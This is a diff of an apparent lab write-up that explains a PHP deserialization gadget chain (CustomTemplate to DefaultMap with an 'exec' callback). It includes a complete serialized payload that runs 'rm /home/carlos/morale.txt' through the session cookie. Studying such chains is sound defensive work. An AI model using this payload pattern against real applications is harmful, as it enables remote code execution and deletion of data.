@@ -370,26 +370,25 @@ Looking at the source code revealed we can see several important components:
 - **Description Class**: Defines HTML and text descriptions
 - **Default Map Class**: Contains a dangerous `__get()` method that executes callbacks
 
-The vulnerability exists because of a "gadget chain" where multiple classes interact in a way that allows code execution:
-- When PHP deserializes the session cookie, it creates objects and calls magic methods
-- The `__wakeup()` method in CustomTemplate calls `build_product()`. This creates a new Product using `$this->default_desc_type` and `$this->desc`
-- If we can control these values, we can create a chain where:
-    - `default_desc_type` is our shell command (`rm /home/carlos/morale.txt`)
-    - `desc` is a DefaultMap object and DefaultMap's callback is set to `exec`
-
-`O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}`
-
-This serialized object represents:
-- A CustomTemplate object with 2 properties
-- `default_desc_type` containing our shell command
-- `desc` containing a DefaultMap object with its callback set to `exec`
-
 PHP has special functions called "magic methods" that automatically run during certain events:
 - `__construct()`: Runs when an object is created
 - `__wakeup()`: Runs when an object is deserialized
 - `__get()`: Runs when you try to access a property that doesn't exist
 - `__destruct()`: Runs when an object is destroyed
 
+`O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}`
+
+This serialized object represents:
+- A CustomTemplate object with 2 properties
+- `default_desc_type` containing our shell command (rm /home/carlos...)
+- `desc` containing a DefaultMap object with its callback set to `exec`
+
+The vulnerability exists because of a "gadget chain" where multiple classes interact in a way that allows code execution:
+- When PHP deserializes the session cookie, it creates objects and calls magic methods
+- The `__wakeup()` method in CustomTemplate calls `build_product()`. This creates a new Product using `$this->default_desc_type` and `$this->desc`
+- If we can control these values, we can create a chain where:
+    - `default_desc_type` is our shell command (`rm /home/carlos/morale.txt`)
+    - `desc` is a DefaultMap object and DefaultMap's callback is set to `exec`
 
 1. **First Gadget - CustomTemplate**:
 - When deserialized, its `__wakeup()` method runs. This method calls `build_product()` which creates a new Product with the values of `default_desc_type` and `desc`.
@@ -408,16 +407,6 @@ s:17:"default_desc_type" --> s:26:"rm /home/carlos/morale.txt"
 	
 s:4:"desc"; --> O:10:"DefaultMap" ({ s:8:"callback" --> s:4:"exec"; }
 	**'desc' = 'DefaultMap'** object WHERE **'callback' = 'exec'**
-
-
-`desc->default_desc_type`
-.
-`DefaultMap->default_desc_type` which invokes `__get("default_desc_type")` because **default_desc_type** property does not exists for DefaultMap object `__get("default_desc_type")` will return  `call_user_func($this->callback, $name)`
-where **'callback' = 'exec'**  and **$name='default_desc_type'**
-.
-..
-`call_user_func("exec", "rm /home/carlos/morale.txt")`  will return `exec("rm /home/carlos/morale.txt");`
-
 
 desc(default_desc_type) ==> DefaultMap(default_desc_type) == _ _get(default_desc_type)  ==> return(callback, default_desc_type) ==> return(exec, 'rm /home/carlos/morale.txt) ==> exec(rm /home/carlos/morale.txt)
 
